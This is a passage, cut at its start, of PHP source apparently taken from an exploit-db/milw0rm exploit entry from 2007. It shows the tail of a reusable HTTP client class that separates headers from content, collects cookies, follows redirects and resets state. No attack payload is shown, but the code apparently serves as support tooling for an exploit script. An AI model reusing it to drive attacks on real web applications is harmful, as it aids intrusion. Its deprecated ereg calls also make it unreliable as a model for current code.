str_repeat('-',29).$this->boundary.\"--\\r\\n\";\r\n\t\treturn $this->sock();\r\n\t}\r\n\r\n\t\r\n\t/**\r\n\t * This function returns the content\r\n\t * of the server response, without\r\n\t * the headers.\r\n\t * \r\n\t * @access  public\r\n\t * @param   string code ServerResponse\r\n\t * @return  string $this->server_content\r\n\t * @example $this->getcontent()\r\n\t * @example $this->getcontent($this->get('http://localhost/'))\r\n\t * \r\n\t */\r\n\tfunction getcontent($code='')\r\n\t{\r\n\t\tif(empty($code))\r\n\t\t   $code = $this->recv;\r\n\r\n\t\t$code = explode(\"\\r\\n\\r\\n\",$code);\r\n\t\t$this->server_content = '';\r\n\t\t\r\n\t\tfor($i=1;$i<count($code);$i++)\r\n\t\t   $this->server_content .= $code[$i];\r\n\r\n\t\treturn $this->server_content;\r\n\t}\r\n\r\n\t\r\n\t/**\r\n\t * This function returns the headers\r\n\t * of the server response, without\r\n\t * the content.\r\n\t * \r\n\t * @access  public\r\n\t * @param   string code ServerResponse\r\n\t * @return  string $this->server_header\r\n\t * @example $this->getcontent()\r\n\t * @example $this->getcontent($this->post('http://localhost/','1=2'))\r\n\t * \r\n\t */\r\n\tfunction getheader($code='')\r\n\t{\r\n\t\tif(empty($code))\r\n\t\t   $code = $this->recv;\r\n\r\n\t\t$code = explode(\"\\r\\n\\r\\n\",$code);\r\n\t\t$this->server_header = $code[0];\r\n\t\t\r\n\t\treturn $this->server_header;\r\n\t}\r\n\r\n\t\r\n\t/**\r\n\t * This function is called by the\r\n\t * cookiejar() function. It adds the\r\n\t * value of the \"Set-Cookie\" header\r\n\t * in the \"Cookie\" header for the\r\n\t * next request. You don't have to\r\n\t * call it.\r\n\t * \r\n\t * @access private\r\n\t * @param  string code ServerResponse\r\n\t * \r\n\t */\r\n\tfunction getcookie()\r\n\t{\r\n\t\tforeach(explode(\"\\r\\n\",$this->getheader()) as $header)\r\n\t\t{\r\n\t\t\tif(preg_match('/set-cookie/i',$header))\r\n\t\t\t{\r\n\t\t\t\t$fequal = strpos($header,'=');\r\n\t\t\t\t$fvirgu = strpos($header,';');\r\n\t\t\t\t\r\n\t\t\t\t// 12=strlen('set-cookie: ')\r\n\t\t\t\t$cname  = substr($header,12,$fequal-12);\r\n\t\t\t\t$cvalu  = substr($header,$fequal+1,$fvirgu-(strlen($cname)+12+1));\r\n\t\t\t\t\r\n\t\t\t\t$this->cookie[trim($cname)] = trim($cvalu);\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\r\n\r\n\t/**\r\n\t * This function is called by the\r\n\t * get()/post() functions. You\r\n\t * don't have to call it.\r\n\t *\r\n\t * @access  private\r\n\t * @param   string urltarg Url\r\n\t * @example $this->target('http://localhost/')\r\n\t * \r\n\t */\r\n\tfunction target($urltarg)\r\n\t{\r\n\t\tif(!ereg('^http://',$urltarg))\r\n\t\t   $urltarg = 'http://'.$urltarg;\r\n\t\t   \r\n\t\t$urlarr     = parse_url($urltarg);\r\n\t\t$this->url  = 'http://'.$urlarr['host'].$urlarr['path'];\r\n\t\t\r\n\t\tif(isset($urlarr['query']))\r\n\t\t   $this->url .= '?'.$urlarr['query'];\r\n\t\t\r\n\t\t$this->port = !empty($urlarr['port']) ? $urlarr['port'] : 80;\r\n\t\t$this->host = $urlarr['host'];\r\n\t\t\r\n\t\tif($this->port != '80')\r\n\t\t   $this->host .= ':'.$this->port;\r\n\r\n\t\tif(!isset($urlarr['path']) or empty($urlarr['path']))\r\n\t\t   die(\"Error: No path precised\");\r\n\r\n\t\t$this->path = substr($urlarr['path'],0,strrpos($urlarr['path'],'/')+1);\r\n\r\n\t\tif($this->port > 65535)\r\n\t\t   die(\"Error: Invalid port number\");\r\n\t}\r\n\t\r\n\t\r\n\t/**\r\n\t * If you call this function,\r\n\t * the script will extract all\r\n\t * 'Set-Cookie' headers values\r\n\t * and it will automatically add\r\n\t * them into the 'Cookie' header\r\n\t * for all next requests.\r\n\t *\r\n\t * @access  public\r\n\t * @param   integer code 1(enabled) 0(disabled)\r\n\t * @example $this->cookiejar(0)\r\n\t * @example $this->cookiejar(1)\r\n\t * \r\n\t */\r\n\tfunction cookiejar($code)\r\n\t{\r\n\t\tif($code=='0')\r\n\t\t   $this->cookiejar=FALSE;\r\n\r\n\t\telseif($code=='1')\r\n\t\t   $this->cookiejar=TRUE;\r\n\t}\r\n\r\n\r\n\t/**\r\n\t * If you call this function,\r\n\t * the script will follow all\r\n\t * redirections sent by the server.\r\n\t * \r\n\t * @access  public\r\n\t * @param   integer code 1(enabled) 0(disabled)\r\n\t * @example $this->allowredirection(0)\r\n\t * @example $this->allowredirection(1)\r\n\t * \r\n\t */\r\n\tfunction allowredirection($code)\r\n\t{\r\n\t\tif($code=='0')\r\n\t\t   $this->allowredirection=FALSE;\r\n\t\t   \r\n\t\telseif($code=='1')\r\n\t\t   $this->allowredirection=TRUE;\r\n\t}\r\n\r\n\t\r\n\t/**\r\n\t * This function is called if\r\n\t * allowredirection() is enabled.\r\n\t * You don't have to call it.\r\n\t *\r\n\t * @access private\r\n\t * @return string $this->get('http://'.$this->host.$this->path.$this->last_redirection)\r\n\t * @return string $this->get($this->last_redirection)\r\n\t * @return string $this->recv;\r\n\t * \r\n\t */\r\n\tfunction getredirection()\r\n\t{\r\n\t\tif(preg_match('/(location|content-location|uri): (.*)/i',$this->getheader(),$codearr))\r\n\t\t{\r\n\t\t\t$this->last_redirection = trim($codearr[2]);\r\n\t\t\t\r\n\t\t\tif(!ereg('://',$this->last_redirection))\r\n\t\t\t   return $this->get('http://'.$this->host.$this->path.$this->last_redirection);\r\n\r\n\t\t\telse\r\n\t\t\t   return $this->get($this->last_redirection);\r\n\t\t}\r\n\t\telse\r\n\t\t   return $this->recv;\r\n\t}\r\n\r\n\r\n\t/**\r\n\t * This function allows you\r\n\t * to reset some parameters.\r\n\t * \r\n\t * @access  public\r\n\t * @param   string func Param\r\n\t * @example $this->reset('header')\r\n\t * @example $this->reset('cookie')\r\n\t * @example $this->reset()\r\n\t * \r\n\t */\r\n\tfunction reset($func='')\r\n\t{\r\n\t\tswitch($func)\r\n\t\t{\r\n\t\t\tcase 'header':\r\n\t\t\t$this->header = array('');\r\n\t\t\tbreak;\r\n\t\t\t\t\r\n\t\t\tcase 'cookie':\r\n\t\t\t$this->cookie = array('');\r\n\t\t\tbreak;\r\n\t\t\t\t\r\n\t\t\tdefault:\r\n\t\t\t$this->cookiejar = '';\r\n\t\t\t$this->header = array('');\r\n\t\t\t$this->cookie = array('');\r\n\t\t\t$this->allowredirection = '';\r\n\t\t\tbreak;\r\n\t\t}\r\n\t}\r\n}\r\n?>\r\n\r\n# milw0rm.com [2007-06-24]",
  "url": "https://www.exploit-db.com/exploits/4096"
}